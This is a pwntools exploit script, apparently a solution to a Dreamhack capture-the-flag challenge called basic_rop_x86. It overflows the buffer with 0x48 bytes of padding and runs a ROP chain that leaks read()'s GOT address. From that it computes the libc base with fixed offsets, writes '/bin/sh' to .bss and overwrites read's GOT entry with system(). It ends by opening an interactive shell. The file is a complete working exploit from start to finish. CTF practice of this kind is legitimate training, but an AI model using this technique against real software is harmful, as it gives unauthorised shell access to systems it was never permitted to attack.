#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'

p = pwn.process("/tmp/basic_rop_x86")
#p = pwn.remote("host1.dreamhack.games", 10079)
elf = pwn.ELF("/tmp/basic_rop_x86")
libc = elf.libc
rop = pwn.ROP(elf)

rop.write(1,elf.got["read"],4)
rop.read(0, elf.bss(), 8)
rop.read(0, elf.got["read"], 4)

print("\n====================ROP Payload====================")
pwn.log.info(rop.dump())

padding = b"A"*0x48
payload = padding
payload += rop.chain()

pwn.log.info("Sending payload. . .")
p.sendline(payload)

p.recv(0x40)
read_addr = pwn.u32(p.recv(4))
print("\n====================Read function Address====================")
tmp = hex(read_addr)
pwn.log.info("Address: " + tmp)

read_offset = 0xd4350
libc_base = read_addr - read_offset
print("\n====================LIBC Base Address====================")
pwn.log.info("Address: " + hex(libc_base))

system_addr = libc_base + 0x3a940
print("\n====================System function Address====================")
pwn.log.info("Address: " + hex(system_addr))

print("\n====================Set bss section====================")
pwn.log.info("Send /bin/sh")
p.sendline("/bin/sh"+"\x00")

print("\n====================Change read got to system function====================")
pwn.log.info("send system function address. . .")
p.sendline(pwn.p32(system_addr))

print("\n====================Call system function====================")
p.interactive()
